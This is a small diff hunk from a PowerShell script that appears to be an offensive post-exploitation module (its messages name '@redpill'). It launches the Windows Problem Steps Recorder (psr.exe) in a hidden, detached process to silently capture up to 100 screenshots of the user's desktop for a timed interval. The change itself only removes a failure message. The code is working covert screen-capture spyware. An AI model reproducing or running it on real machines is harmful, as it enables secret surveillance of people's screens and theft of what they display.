@@ -63,7 +63,6 @@ If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
 
         ## Start psr.exe (-WindowStyle hidden) process detach (orphan) from parent process
         Start-Process -WindowStyle hidden powershell -ArgumentList "psr.exe", "/start", "/output $CaptureFile", "/sc 1", "/maxsc 100", "/gui 0;", "Start-Sleep -Seconds $Timmer;", "psr.exe /stop" -ErrorAction SilentlyContinue|Out-Null
-        If(-not($LASTEXITCODE -eq 0)){write-host "[abort] @redpill cant start psr.exe process" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 2}
     }Else{
         ## PSR.exe (error report service) not found in current system ..
         write-host "[fail] Not found: $Env:WINDIR\System32\psr.exe" -ForeGroundColor Red -BackgroundColor Black
